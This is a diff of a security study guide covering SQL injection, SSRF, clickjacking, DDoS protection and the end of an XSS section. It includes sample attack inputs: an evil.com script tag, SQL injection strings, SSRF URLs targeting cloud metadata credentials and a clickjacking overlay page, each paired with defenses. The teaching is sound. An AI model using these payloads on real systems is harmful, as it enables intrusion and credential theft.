-- `innerHTML` with user input
-- `eval()`
-- `document.write()`
-
-**Prefer:**
-
-- `textContent`
-- Safe frameworks (React, Angular)
-- Templating engines with auto-escape
-
-### XSS in modern apps
-
-Modern frameworks reduce XSS risk:
-
-| Framework | Protection |
-|-----------|------------|
-| **React** | Escapes values by default |
-| **Angular** | Sanitizes templates |
-| **Vue** | Escapes bindings |
-
-Risks still exist with:
-
-- `dangerouslySetInnerHTML` (React)
-- Unsafe DOM manipulation
-
-### High-level attack flow
-
-```text
-Attacker → injects script → server stores/reflects → user visits → browser executes → attacker gains access
-```
-
-### High-level defense architecture
-
-```text
-User input → validation → sanitization → storage → output encoding → browser rendering → CSP enforcement
-```
-
-### Best practices
-
-- Validate and sanitize all user input
-- Encode output for the correct context (HTML, URL, JS)
-- Use CSP headers
-- Set HttpOnly and Secure on session cookies
-- Avoid unsafe DOM APIs with untrusted data
-- Keep frameworks and libraries updated
-
-### Summary
-
-```text
-XSS = malicious script injected into trusted page, executed in victim browser
-Types: stored, reflected, DOM-based — prevent with encoding, sanitization, CSP, HttpOnly
-Modern frameworks help but unsafe APIs (innerHTML, dangerouslySetInnerHTML) still risky
-```
+**Stored XSS in a comment system:** Disqus-style widgets and many self-hosted forums historically stored comments as HTML. An attacker posts `<script src="https://evil.com/hook.js">`. Without server-side sanitization (e.g. OWASP Java Encoder on output, or DOMPurify on ingest), every reader executes the script in the forum's origin. With **Content-Security-Policy: default-src 'self'; script-src 'self'**, inline and external evil scripts are blocked even if HTML sanitization fails once — defense in depth. GitHub issue comments render Markdown through a strict pipeline (sanitize → encode) specifically to prevent this class of bug at scale.
 
 ---
 
 ## 10.15 SQL Injection
 
-### What is SQL injection?
+### Overview
 
-**SQL injection (SQLi)** is a security vulnerability where an attacker injects malicious SQL queries into application input fields to manipulate the database.
+A login form asks for your name; instead you answer with a full set of instructions the receptionist reads aloud to the database clerk verbatim. If the clerk follows every word as SQL, you can list every room or walk in without a real key. **SQL injection (SQLi)** is untrusted input breaking out of its quoted string or numeric slot and becoming part of the query language itself.
 
-**Key idea:** untrusted input becomes part of the SQL query.
+Technically, SQLi happens when application code builds SQL by concatenating user input. The database parser cannot tell data from code — `1 OR 1=1` in a `WHERE` clause changes logic; `' UNION SELECT password FROM users --` exfiltrates columns the app never intended to return.
 
-### Why SQL injection happens
+---
 
-SQL injection occurs when:
+### What problem it fixes
 
-- User input is directly concatenated into SQL queries
-- No input validation or sanitization
-- No parameterized queries / prepared statements
+Relational databases execute whatever SQL string the application sends. Without parameter binding, any field — search box, login form, sort column, JSON filter — can alter query structure. SQLi fixes enforce a strict separation: **query shape is fixed at compile/prepare time; user values are bound as data only.**
 
-**Example (bad practice):**
+---
+
+### What it does
+
+Primary and supporting controls:
+
+| Control | Role |
+|---------|------|
+| **Prepared statements / parameterized queries** | Placeholders (`?`, `$1`) — driver sends plan and values separately |
+| **ORM parameterization** | Query builders bind values; avoid raw string SQL with interpolation |
+| **Input validation** | Allowlist IDs as integers, emails as patterns — reduces attack surface |
+| **Least-privilege DB user** | App role cannot `DROP TABLE`, `FILE`, or read admin tables |
+| **Error hygiene** | Generic client errors; no stack traces or SQL syntax leaking schema |
+| **WAF** | Blocks obvious payloads (`' OR 1=1`, `UNION SELECT`) — belt, not suspenders |
+
+Injection classes:
+
+| Type | Attacker sees results? | Technique |
+|------|------------------------|-----------|
+| **In-band (union/error)** | Yes | `UNION SELECT`, forced errors |
+| **Blind boolean** | No direct rows | `AND 1=1` vs `AND 1=2` changes page behavior |
+| **Time-based blind** | Timing only | `SLEEP(5)` if condition true |
+| **Out-of-band** | Via DNS/HTTP side channel | Rare; requires DB features allowing external calls |
+
+---
+
+### How it works — the architecture inside
+
+**Vulnerable login:**
 
 ```text
-query = "SELECT * FROM users WHERE id = " + userInput
+query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pass + "'"
+Input password: ' OR '1'='1
+Final: ... AND password='' OR '1'='1'  → returns admin row → auth bypass
 ```
 
-### Simple example
-
-**User input:**
-
-```text
-1 OR 1=1
-```
-
-**Query becomes:**
+**Safe parameterized query:**
 
 ```sql
-SELECT * FROM users WHERE id = 1 OR 1=1
+SELECT * FROM users WHERE username = ? AND password_hash = ?
+-- bind: ("admin", computed_hash) — input never parsed as SQL
 ```
 
-**Result:** returns all users instead of one user.
-
-### How SQL injection works
-
-**Attack flow:**
-
-```text
-Step 1: Attacker provides malicious input
-Step 2: Application builds SQL query unsafely
-Step 3: Database executes modified query
-Step 4: Data is leaked or modified
-```
-
-### Types of SQL injection
-
-**1. In-band SQL injection**
-
-Attacker uses the same channel to attack and retrieve results.
-
-- Error-based
-- Union-based
-
-**2. Error-based SQL injection**
-
-Attacker forces database errors to extract information.
+**Union exfiltration (in-band):**
 
 ```sql
-' OR 1=1 --
+-- Original: SELECT name, price FROM products WHERE id = '1'
+-- Injected id: 1' UNION SELECT username, password FROM users --
+-- DB returns attacker-chosen columns from users table
 ```
 
-**3. Union-based SQL injection**
-
-Attacker uses `UNION` to combine results from multiple queries.
-
-```sql
-' UNION SELECT username, password FROM users --
+```mermaid
+flowchart LR
+    Input[Attacker input] --> App[App builds query]
+    App --> Unsafe{String concat?}
+    Unsafe -->|Yes| DB[(Database executes altered SQL)]
+    Unsafe -->|No| Param[Prepared statement]
+    Param --> DB
+    DB --> Leak[Data leak / bypass / DROP]
 ```
 
-**4. Blind SQL injection**
-
-No direct output visible. Attacker infers data using true/false responses.
-
-```sql
-' AND 1=1 --
-' AND 1=2 --
-```
-
-If response differs → injection exists.
-
-**5. Time-based blind SQLi**
-
-Attacker uses delay functions.
-
-```sql
-' OR IF(1=1, SLEEP(5), 0) --
-```
-
-If response is delayed → query executed.
-
-**6. Out-of-band SQL injection**
-
-Data is exfiltrated through external channels like DNS or HTTP requests.
-
-### Impact of SQL injection
-
-SQL injection can cause:
-
-- Data theft (users, passwords, emails)
-- Data modification
-- Data deletion
-- Authentication bypass
-- Admin access takeover
-- Entire database compromise
-
-### Example of auth bypass
-
-**Login query:**
-
-```sql
-SELECT * FROM users
-WHERE username = 'admin'
-AND password = 'userInput'
-```
-
-**Attacker input:**
+**Defense stack:**
 
 ```text
-' OR '1'='1
+HTTP request → WAF signature check → app validates types → ORM/prepare with binds
+→ DB connection as least-privilege role → errors logged server-side only
 ```
 
-**Final query:**
+---
 
-```sql
-SELECT * FROM users
-WHERE username = 'admin'
-AND password = '' OR '1'='1'
-```
+### Pitfalls and design tips
 
-**Result:** login successful without password.
+- **String formatting is never safe** — `f"SELECT ... {id}"` and stored procedures with dynamic SQL inside are still vulnerable if built by concat.
+- ORMs are not magic: `.raw()`, `execute(f"...")`, and sortable column names from user input re-open SQLi.
+- **Second-order SQLi** — payload stored in DB, executed later in a different query without binding.
+- `LIKE` clauses and `IN (...)` lists need binding per element, not manual quote escaping.
+- DB user for the app should lack **DDL** and **SUPER** privileges; use read replicas for reporting with read-only roles.
+- WAF blocks `' OR 1=1` but misses encoded/obfuscated variants — always parameterize in code.
+- NoSQL injection (MongoDB `$where`, operator injection) follows the same mental model — untrusted input must not become operators.
 
-### Why SQL injection is dangerous
+---
 
-Because attacker can:
+### Real-world example
 
-- Modify queries
-- Read sensitive tables
-- Delete data (`DROP TABLE`)
-- Escalate privileges
-
-Database trusts application input blindly.
-
-### Prevention techniques
-
-**1. Prepared statements (most important)**
-
-```sql
-SELECT * FROM users WHERE id = ?
-```
-
-Database treats input as data, not code.
-
-**2. Parameterized queries**
-
-Safe binding of values:
-
-```text
-query = "SELECT * FROM users WHERE id = ?"
-```
-
-**3. Stored procedures**
-
-SQL logic stored in database with controlled inputs.
-
-**4. Input validation**
-
-Allow only expected formats:
-
-- Numeric IDs
-- Email format
-- Whitelisted values
-
-**5. Output limitation**
-
-Do not expose raw database errors to users.
-
-**6. Principle of least privilege**
-
-Database user should not have:
-
-- `DROP TABLE` permission
-- Admin privileges
-
-Only required permissions should be granted.
-
-**7. Web application firewall (WAF)**
-
-Detects and blocks suspicious SQL patterns.
-
-**Examples:** `' OR 1=1 --` · `UNION SELECT`
-
-### Secure query example
-
-**Bad:**
-
-```text
-query = "SELECT * FROM users WHERE id = " + userInput
-```
-
-**Good:**
-
-```text
-query = "SELECT * FROM users WHERE id = ?"
-bind(userInput)
-```
-
-### High-level attack flow
-
-```text
-Attacker input → unsafe query → database executes malicious SQL → data leak/modification → system compromise
-```
-
-### High-level defense architecture
-
-```text
-User input → validation → parameterized queries → application → database (least privilege) → WAF monitoring
-```
-
-### Best practices
-
-- Always use parameterized queries or prepared statements
-- Never concatenate user input into SQL strings
-- Validate input format before querying
-- Grant minimal database permissions to app users
-- Hide detailed database errors from clients
-- Use WAF as an additional layer, not a substitute
-
-### Summary
-
-```text
-SQLi = untrusted input alters SQL query execution
-Prevent with prepared statements, validation, least-privilege DB users, and WAF
-Never build queries by string concatenation with user input
-```
+**Authentication bypass in legacy PHP apps** (documented in countless CVEs): `mysql_query("SELECT * FROM users WHERE user='$user' AND pass='$pass'")` with password `' OR '1'='1' --` logs in as the first user. Migration to **PDO prepared statements** (`$stmt->execute([$user, $pass])`) fixes the injection path. Shopify, WordPress plugins, and enterprise CRMs have shipped similar patches — the pattern is universal: parameterized queries plus removing DB admin rights from the web tier. Tools like **sqlmap** automate blind extraction against remaining concat-based endpoints during pentests.
 
 ---
 
 ## 10.16 SSRF
 
-### What is SSRF?
+### Overview
 
-**SSRF (Server-Side Request Forgery)** is a vulnerability where an attacker tricks a server into making requests to unintended internal or external resources.
+You ask a hotel concierge to fetch a package from an address you provide. You give them the staff-only floor plan room instead of a public shop — the concierge has master access, so they bring back internal documents you could never reach yourself. **SSRF (Server-Side Request Forgery)** is the same: the attacker supplies a URL; your **server** fetches it, often from networks and metadata endpoints the public internet cannot touch.
 
-**Key idea:** attacker controls the URL → server makes the request.
+Technically, SSRF is a vulnerability where user-controlled URLs (or hostnames) drive server-side HTTP clients, DNS resolvers, or image processors. The server's network position — localhost, VPC private ranges, cloud metadata at `169.254.169.254` — becomes the attacker's vantage point.
 
-### Why SSRF happens
+---
 
-SSRF occurs when:
+### What problem it fixes
 
-- User input is used to fetch URLs
-- No validation of target URL
-- Server has access to internal network
-- Trust is placed on user-controlled URLs
+Features like "import image from URL," webhook callbacks, PDF renderers, and SSO validators inherently perform outbound requests. If the target is fully attacker-controlled without validation, the server becomes a proxy into internal infrastructure. SSRF controls constrain **where** the server may connect and **what** responses are returned to the caller.
 
-**Example:**
+---
 
-```text
-fetch(userProvidedUrl)
-```
+### What it does
 
-### Simple example
+Mitigations combine application rules and network posture:
 
-**User input:**
+| Control | Purpose |
+|---------|---------|
+| **Domain allowlist** | Only `api.trusted-cdn.com`, not arbitrary hosts |
+| **Block private/reserved IPs** | Reject `127.0.0.1`, `10/8`, `192.168/16`, `169.254.169.254` |
+| **DNS rebinding awareness** | Resolve hostname, then validate IP before connect |
+| **Disable redirect follow** | `attacker.com` → `302` → `http://127.0.0.1/admin` |
+| **Network segmentation** | App tier cannot reach admin APIs or metadata |
+| **IMDSv2 (AWS)** | Metadata requires session token — raises bar on cloud credential theft |
+| **Egress firewall** | Outbound allowlist at VPC level |
 
-```text
-http://internal-service/admin
-```
+SSRF variants: **basic** (response visible to attacker), **blind** (no direct response — infer via timing/webhooks), **partial** (only path or scheme partially controlled).
 
-**Server executes:**
+---
 
-```http
-GET http://internal-service/admin
-```
+### How it works — the architecture inside
 
-**Result:** server accesses internal system not exposed publicly.
-
-### How SSRF works
-
-**Attack flow:**
+**Image proxy feature — vulnerable:**
 
 ```text
-Step 1: Attacker provides malicious URL
-Step 2: Server fetches the URL
-Step 3: Request goes to internal/external system
-Step 4: Response is returned to attacker indirectly
+POST /fetch-image  body: { "url": "http://localhost:8080/admin/users" }
+Server: GET http://localhost:8080/admin/users → returns internal JSON → leaked to attacker
 ```
 
-### Example scenario
-
-**Image fetch feature** — user submits:
+**Cloud metadata attack (AWS classic):**
 
 ```text
-image_url = http://example.com/image.jpg
+Attacker sets url = http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+Server fetches → temporary AWS access key in response → attacker exfiltrates via error message or stored output
 ```
 
-Server does: `GET image_url`
-
-**Attacker input:**
+**Redirect-based SSRF:**
 
 ```text
-http://localhost:8080/admin
+Server fetches http://evil.com/redirect
+  → 302 Location: http://10.0.0.5:6379/  (internal Redis)
+  → if redirects followed, internal service probed
 ```
 
-**Server request:**
-
-```http
-GET http://localhost:8080/admin
-```
-
-**Result:** internal admin panel exposed.
-
-### Why SSRF is dangerous
-
-Because the server often has:
-
-- Access to internal network
-- Access to cloud metadata services
-- Access to protected services
-
-Attacker can exploit this to:
-
-- Access internal APIs
-- Steal cloud credentials
-- Scan internal network
-- Access admin panels
-
-### Common SSRF targets
-
-**Internal services:**
-
-- `localhost` (`127.0.0.1`)
-- `192.168.x.x`
-- `10.x.x.x` networks
-
-**Cloud metadata services:**
-
-- AWS: `http://169.254.169.254`
-- GCP metadata endpoints
-- Azure instance metadata
-
-**Admin panels:**
-
-- `/admin`
-- `/internal`
-- `/metrics`
-
-### Impact of SSRF
-
-SSRF can lead to:
-
-- Internal network access
-- Data leakage
-- Credential theft
-- Cloud account compromise
-- Port scanning internal systems
-- Remote code execution (in some cases)
-
-### Types of SSRF
-
-| Type | Description |
-|------|-------------|
-| **Basic SSRF** | Direct request to attacker-controlled URL (e.g. `fetch(userUrl)`) |
-| **Blind SSRF** | No direct response shown; attacker infers via timing, logs, or side effects |
-| **Partial SSRF** | Server processes only part of URL or follows redirects |
-
-### Cloud metadata attack
-
-Most critical SSRF case.
-
-**Example (AWS):**
+**Safe handling pattern:**
 
 ```text
-http://169.254.169.254/latest/meta-data/
+Parse URL → scheme in {https} only → resolve DNS → IP not in blocklist
+  → host in allowlist → fetch with redirects disabled → timeout + size cap → return sanitized body
 ```
 
-**Contains:**
-
-- IAM credentials
-- Instance info
-- Security tokens
-
-If accessed → attacker steals cloud credentials.
-
-### Redirect-based SSRF
-
-```text
-Server fetches URL → redirect to internal service → server follows redirect → internal access
+```mermaid
+flowchart LR
+    Attacker[Attacker URL] --> App[App server fetch]
+    App --> Validate[URL allowlist + IP check]
+    Validate -->|Fail| Block[Reject]
+    Validate -->|Pass| Outbound[Outbound HTTP]
+    Outbound --> Internal[Internal service / metadata]
+    Internal --> App
+    App --> Attacker
 ```
 
-**Example:** `http://attacker.com` → redirects to `127.0.0.1`
+---
 
-### SSRF attack flow
+### Pitfalls and design tips
 
-```text
-Attacker → injects URL → app server → HTTP request → internal/external service → sensitive data leaked
-```
+- **Denylists alone fail** — attackers use decimal IPs (`2130706433` = 127.0.0.1), IPv6 (`::1`), DNS rebinding, and URL parsers that disagree (`http://127.1`, `@` tricks).
+- Validate **after DNS resolution** on the IP you actually connect to, not just the hostname string.
+- **PDF generators, headless Chrome, and webhooks** are common SSRF sinks — audit all outbound fetchers.
+- Blind SSRF still enables port scanning and triggering internal actions (Redis `CONFIG`, Jenkins script consoles).
+- Link-local metadata exists on **GCP, Azure, and Kubernetes** too — not AWS-only.
+- Return only necessary response bytes; error messages must not echo full internal response bodies.
+- Interview: SSRF is **server** as victim; CSRF is **user browser** as victim — different trust boundaries.
 
-### Prevention techniques
+---
 
-**1. URL validation**
+### Real-world example
 
-Allow only trusted domains.
-
-```text
-Whitelist: api.trusted.com, images.trustedcdn.com
-```
-
-**2. Block internal IPs**
-
-Block:
-
-- `127.0.0.1`
-- `10.0.0.0/8`
-- `192.168.0.0/16`
-- `169.254.169.254`
-
-**3. Use allowlist instead of denylist**
-
-Allow only known safe destinations.
-
-**4. Disable redirect following**
-
-Prevent server from following redirects.
-
-**5. Network segmentation**
-
-Separate internal and external networks.
-
-```text
-Public services | internal services (not reachable from app)
-```
-
-**6. Metadata service protection**
-
-Cloud providers offer protections like:
-
-- IMDSv2 (AWS)
-- Token-based metadata access
-
-**7. Limit outbound requests**
-
-Restrict server ability to call network endpoints.
-
-**8. Input sanitization**
-
-Validate:
-
-- URL scheme (only `http`/`https`)
-- Hostname
-- Port restrictions
-
-### Safe URL handling example
-
-**Bad:**
-
-```text
-fetch(userInputUrl)
-```
-
-**Good:**
-
-```text
-if (isAllowedDomain(url)) {
-    fetch(url)
-} else {
-    rejectRequest()
-}
-```
-
-### High-level attack flow
-
-```text
-Attacker input URL → server fetches URL → internal network access → sensitive data exposed
-```
-
-### High-level defense architecture
-
-```text
-User input URL → validation (whitelist) → URL parser → firewall rules → outbound service → restricted network
-```
-
-### Best practices
-
-- Never pass raw user input to server-side HTTP clients
-- Use strict domain allowlists, not blocklists alone
-- Block private IP ranges and metadata endpoints
-- Disable or limit HTTP redirects on outbound calls
-- Segment networks so app servers cannot reach internal admin APIs
-- Use cloud metadata protections (e.g. IMDSv2)
-
-### Summary
-
-```text
-SSRF = attacker makes server request unintended internal/external URLs
-Critical target: cloud metadata (169.254.169.254) for credential theft
-Prevent with URL allowlists, block private IPs, no redirect follow, network segmentation
-```
+**Capital One breach (2019)** involved SSRF against an misconfigured WAF and metadata access pattern — an attacker exploited a server-side request path to reach cloud instance metadata and obtain IAM role credentials, then exfiltrated S3 data. Remediation across the industry accelerated **IMDSv2** adoption (session-oriented metadata) and blocking `169.254.169.254` at egress. For application design, GitHub's **SSRF guidance** for webhooks requires fixed callback allowlists and treats user-supplied URLs in CI log viewers and import features as high-risk code paths.
 
 ---
 
 ## 10.17 Clickjacking
 
-### What is clickjacking?
+### Overview
 
-**Clickjacking** is a UI-based attack where an attacker tricks a user into clicking something different from what they see.
+You tap "Claim free prize" on a flashy ad, but invisible glass under your finger actually presses "Confirm wire transfer" on a bank page loaded beneath it. **Clickjacking** (UI redressing) does not inject code — it stacks a deceptive interface over a real one inside the browser so your click lands on a hidden button or link.
 
-**Key idea:** user thinks they are clicking a harmless UI but actually triggers a hidden action.
+Technically, clickjacking embeds a target site in a transparent `<iframe>` (or similar) and overlays attacker-controlled UI. The victim interacts with what they see; the browser delivers the click to the obscured frame, performing authenticated actions if the user is already logged into the framed site.
 
-### Why clickjacking happens
+---
 
-Clickjacking occurs when:
+### What problem it fixes
 
-- Website allows embedding in iframe
-- No protection headers are set
-- UI layers can be overlaid using CSS
-- User trusts visible interface
+Browsers happily render nested browsing contexts. Without framing policy, any site can iframe your checkout or settings page and capture clicks. Clickjacking defenses tell the browser **who may embed your pages** and add UX friction for irreversible actions.
 
-### Simple example
+---
 
-**Attacker page:**
+### What it does
 
-```text
-Visible button:  "Click to win prize"
-Hidden layer:    bank transfer button (iframe)
+| Defense | Effect |
+|---------|--------|
+| **`X-Frame-Options: DENY`** | Legacy header — page cannot be framed |
+| **`X-Frame-Options: SAMEORIGIN`** | Only same site may iframe |
+| **CSP `frame-ancestors`** | Modern replacement — `'none'` or `'self'` |
+| **Frame-busting JS** | `if (top !== self) top.location = self.location` — weak alone |
+| **User confirmation** | Re-auth, OTP, typed "DELETE" for destructive ops |
+| **SameSite cookies** | Indirect — limits some cross-site cookie contexts |
 
-User clicks:     "Win prize"
-Actual action:   money transfer happens
-```
+Clickjacking vs XSS: clickjacking manipulates **clicks** without script injection; XSS runs arbitrary JS in your origin.
 
-### How clickjacking works
+---
 
-**Attack flow:**
+### How it works — the architecture inside
 
-```text
-Step 1: Attacker embeds target site in iframe
-Step 2: Overlays fake UI on top
-Step 3: User interacts with fake interface
-Step 4: Click is executed on hidden real UI
-```
-
-### iframe overlay technique
+**Attack layout:**
 
 ```html
-<iframe src="https://bank.com/transfer"></iframe>
-```
-
-**CSS overlay:**
-
-```text
-opacity: 0
-position: absolute
-z-index: high fake button
+<!-- evil.com -->
+<style>
+  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+  .fake-btn { position: absolute; z-index: 2; /* aligned over real "Transfer" in iframe */ }
+</style>
+<iframe src="https://bank.com/one-click-transfer"></iframe>
+<button class="fake-btn">Win iPhone!</button>
 ```
 
 ```text
-User sees:        fake button
-Browser executes: real button click
+User sees "Win iPhone" → click coordinates hit iframe's Transfer button
+If session cookie is present → bank processes transfer
 ```
 
-### Impact of clickjacking
-
-Clickjacking can cause:
-
-- Unauthorized transactions
-- Account setting changes
-- Privacy setting modification
-- Password/email changes
-- Social media actions (likes, follows)
-- Enabling permissions unknowingly
-
-### Real-world example
-
-User logged into social media. Attacker page shows "Play video" — behind it, a like button iframe.
-
-User clicks play → actually likes attacker content.
-
-### Why clickjacking works
-
-Because:
-
-- Browser allows iframe embedding
-- No UI visibility of underlying frame
-- User trusts visible UI
-- No click origin verification
-
-### Clickjacking vs XSS
-
-| | Clickjacking | XSS |
-|---|--------------|-----|
-| **Type** | UI manipulation attack | Script injection attack |
-| **Requires** | No code injection | Malicious JavaScript |
-| **Effect** | User clicks hidden elements | Steals or modifies data |
-
-**Difference:** clickjacking → trick clicks · XSS → injects code
-
-### Clickjacking prevention
-
-Main defenses:
-
-- `X-Frame-Options` header
-- Content Security Policy (CSP)
-- Frame busting scripts
-- SameSite cookies (indirect help)
-- UI confirmation dialogs
-
-### X-Frame-Options header
-
-Prevents embedding in iframe.
-
-| Value | Behavior |
-|-------|----------|
-| **DENY** | Completely blocks framing |
-| **SAMEORIGIN** | Allows only same-origin framing |
-
-```http
-X-Frame-Options: DENY
-```
-
-### Content Security Policy (CSP)
-
-Modern protection mechanism.
+**Defense response headers:**
 
 ```http
 Content-Security-Policy: frame-ancestors 'none';
+X-Frame-Options: DENY
 ```
 
-or
+Browser refuses to render the page inside evil.com's iframe — attack surface removed.
 
-```http
-Content-Security-Policy: frame-ancestors 'self';
+```mermaid
+flowchart LR
+    Victim[User on evil.com] --> Fake[Fake UI overlay]
+    Fake --> Iframe[Hidden iframe bank.com]
+    Iframe --> Action[Transfer executed]
+    CSP[CSP frame-ancestors] --> Block[Browser blocks iframe load]
 ```
 
-**Effect:** blocks unauthorized iframe embedding.
+**Sensitive flows:** require explicit confirmation dialog ("Send $500 to account 1234?") so a single misaligned click is insufficient.
 
-### Frame busting script
+---
 
-JavaScript technique:
+### Pitfalls and design tips
 
-```javascript
-if (window.top !== window.self) {
-    window.top.location = window.self.location;
-}
-```
+- Prefer **CSP `frame-ancestors`** over frame-busting scripts — JS can be suppressed in sandboxed iframes.
+- `SAMEORIGIN` still allows your own pages to iframe sensitive endpoints — watch for **self-XSS + clickjacking** combos on subdomains.
+- Payment widgets that **must** be iframed need tightly scoped `frame-ancestors https://partner.com` — not `'none'` globally on every page.
+- Mobile WebViews and embedded browsers may ignore headers — test native shells separately.
+- **Likejacking** on social platforms (invisible Like button) was widespread before `X-Frame-Options` defaults — historical lesson in framing policy.
+- Double-click or drag-to-confirm patterns reduce accidental actions but are not security boundaries alone.
 
-**Purpose:** break out of iframe if embedded.
+---
 
-**Limitation:** can be bypassed in some cases.
+### Real-world example
 
-### UI confirmation mechanisms
-
-For sensitive actions:
-
-- Password confirmation
-- OTP verification
-- Double click confirmation
-- Explicit action dialogs
-
-**Example:** "Are you sure you want to delete account?"
-
-### Safe design practices
-
-**Avoid:**
-
-- Allowing embedding of sensitive pages
-- Performing critical actions via single click
-- Missing CSP headers
-
-**Prefer:**
-
-- Server-side validation
-- Explicit user confirmation
-- Anti-iframe protections
-
-### High-level attack flow
-
-```text
-Attacker page → iframe (target site) → fake overlay → user clicks → real action on target site
-```
-
-### High-level defense architecture
-
-```text
-User browser → CSP / X-Frame-Options → block iframe embedding → prevent overlay attacks
-```
-
-### Best practices
-
-- Set `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` on sensitive pages
-- Prefer CSP over frame busting scripts alone
-- Require confirmation for high-impact actions (transfers, deletes, permission grants)
-- Do not rely on single-click for critical state changes
-
-### Summary
-
-```text
-Clickjacking = hidden iframe + fake overlay tricks user into unintended clicks
-Prevent with X-Frame-Options, CSP frame-ancestors, and confirmation for sensitive actions
-UI attack — no script injection; different from XSS
-```
+**Facebook Likejacking (circa 2010):** Attack pages embedded invisible Facebook iframes with Like buttons positioned under "Play video" graphics. Users spread spam by clicking play. Facebook rolled out **`X-Frame-Options: DENY`** on sensitive endpoints and UI changes requiring explicit confirmation for permissions. Today, **Stripe Checkout** and banking portals set `Content-Security-Policy: frame-ancestors 'none'` on payment flows so third-party sites cannot embed the confirmation step — a direct application of the same defense pattern.
 
 ---
 
 ## 10.18 DDoS Protection
 
-### What is DDoS?
+### Overview
 
-**DDoS (Distributed Denial of Service)** is an attack where multiple systems flood a target service with massive traffic to make it unavailable.
+A shop designed for fifty customers per hour suddenly faces ten thousand people shoving at the door — most are not buying, they are blocking real shoppers from entering. **DDoS (Distributed Denial of Service)** floods a target with traffic from many sources (botnets, amplified UDP, application-layer scrapers) until bandwidth, connection tables, or CPU are exhausted and legitimate users see timeouts or errors.
 
-**Key idea:** overwhelm system resources → service becomes unusable.
+Technically, DDoS is an availability attack at layer 3–7: volumetric floods saturate links, protocol attacks (SYN flood) exhaust state, and application attacks (HTTP POST storms on `/login`) burn app and database capacity. Defense is **layered absorption and filtering** at the edge before traffic reaches origin.
 
-### How DDoS works
+---
 
-```text
-Attacker controls botnet → massive requests → target server → resource exhaustion (CPU, memory, bandwidth) → service slowdown or crash
-```
+### What problem it fixes
 
-### Types of DDoS attacks
+Any public endpoint has finite capacity. Attackers distribute load across compromised hosts or reflection amplifiers so block-by-single-IP fails. Without edge scrubbing, rate limits, and scaling strategy, a moderate botnet can take down an unprotected origin regardless of application code quality.
 
-**1. Volume-based attacks**
+---
 
-Flood bandwidth with huge traffic.
+### What it does
 
-**Examples:** UDP floods · ICMP floods
+Defense layers (outermost first):
 
-**Target:** consume network bandwidth
+| Layer | Techniques |
+|-------|------------|
+| **Network / volumetric** | Anycast, CDN, ISP/cloud scrubbing centers, blackhole routing |
+| **Protocol** | SYN cookies, connection limits, firewall SYN proxies |
+| **Application (L7)** | Rate limiting, CAPTCHA, bot scoring, WAF, caching |
+| **Infrastructure** | Autoscaling, backpressure (`429`), queue shedding |
+| **Architecture** | Stateless edges, read replicas, cache hot paths |
 
-**2. Protocol attacks**
-
-Exploit network protocol weaknesses.
-
-**Examples:** SYN flood · ping of death · fragmented packet attacks
-
-**Target:** consume server connection tables
-
-**3. Application layer attacks**
-
-Target web application logic.
-
-**Examples:** HTTP GET/POST floods · login endpoint flooding · search API abuse
-
-**Target:** consume application CPU and database
-
-### How DDoS impacts systems
-
-- Service downtime
-- High latency
-- Resource exhaustion
-- Database overload
-- API failures
-- Revenue loss
-- Poor user experience
-
-### High-level DDoS flow
+Attack types:
 
 ```text
-Botnet → traffic flood → load balancer / firewall (overwhelmed) → application server → database → system failure
+Volume:     UDP/ICMP floods → saturate Gbps
+Protocol:   SYN flood → fill connection table
+Application: HTTP flood on /api/search → CPU + DB meltdown
 ```
 
-### DDoS protection strategy
+---
 
-Protection is layered:
+### How it works — the architecture inside
 
-- Network layer protection
-- Application layer protection
-- Infrastructure scaling
-- Traffic filtering
-- Rate limiting
-- Behavioral analysis
-
-### Rate limiting
-
-Limits number of requests per user/IP.
+**Attack path:**
 
 ```text
-Example: 100 requests / minute / IP
-If exceeded → block or throttle requests
+Botnet (100k hosts) → SYN/HTTP flood → edge router → load balancer → app tier → database
+Each layer exhausts: bandwidth → SYN backlog → worker threads → connection pool
 ```
 
-**Types:** fixed window · sliding window · token bucket · leaky bucket
-
-### Traffic filtering
-
-Block malicious traffic using rules.
-
-**Examples:**
-
-- Block suspicious IPs
-- Block regions
-- Block known bot networks
-- Filter bad user agents
-
-### Application-layer filtering
-
-At the HTTP layer, a **Web Application Firewall (WAF)** blocks malicious request patterns (SQLi, XSS payloads, bots). Covered in the **WAF** section below.
-
-### CDN (Content Delivery Network)
-
-CDNs absorb traffic closer to users.
+**Defense path:**
 
 ```text
-User → CDN edge server → origin server
+Internet → Anycast CDN edge (absorb + cache static) → DDoS scrubbing (Cloudflare/AWS Shield)
+  → rate limit per IP/ASN → WAF bot rules → origin LB → autoscaling app pool
+  → cache (Redis/CDN) for repeat reads → DB with connection limits
 ```
 
-**Benefits:**
-
-- Reduces load on origin
-- Absorbs traffic spikes
-- Caches static content
-
-### Anycast networking
-
-Traffic routed to nearest server location.
-
-**Benefits:** load distribution · lower latency · attack absorption across regions
-
-### Load balancer protection
-
-Load balancers help:
-
-- Distribute traffic
-- Drop malformed requests
-- Enforce connection limits
-
-Can still be overwhelmed in large attacks.
-
-### Auto scaling
-
-System automatically adds resources.
+**Rate limiting models:**
 
 ```text
-CPU > 70% → add new servers
+Fixed window:   100 req/min per IP — simple; burst at window edge
+Sliding window: smoother distribution
+Token bucket:   allows controlled bursts
+Leaky bucket:   constant outbound processing rate
 ```
 
-Helps handle moderate attacks.
-
-**Limit:** does not stop the attack, only absorbs load.
-
-### Bot detection
-
-Identify non-human traffic.
-
-**Techniques:**
-
-- CAPTCHA challenges
-- Behavioral analysis
-- Mouse movement tracking
-- Request pattern analysis
-
-### SYN flood protection
-
-SYN flood attack: attacker sends many TCP connection requests.
-
-**Protection:**
-
-- SYN cookies
-- Connection limits
-- Firewall filtering
-
-### Connection throttling
-
-Limit concurrent connections per IP/user.
-
-```text
-Example: max 10 connections per IP
+```mermaid
+flowchart LR
+    Bots[Botnet traffic] --> CDN[CDN / anycast edge]
+    CDN --> Scrub[DDoS scrubbing]
+    Scrub --> WAF[WAF + rate limit]
+    WAF --> LB[Load balancer]
+    LB --> App[App servers]
+    App --> Cache[Cache layer]
+    Cache --> DB[(Database)]
 ```
 
-Prevents resource exhaustion.
+**Autoscaling caveat:** adding servers handles **load spikes** but attackers scale too — you pay for their traffic unless filtered upstream. Scrubbing at provider edge is cost-effective.
 
-### Caching strategies
+**Backpressure:** when overloaded, return `503`/`429` quickly rather than queue unbounded — protects thread pools and DB.
 
-Cache responses to reduce backend load.
+---
 
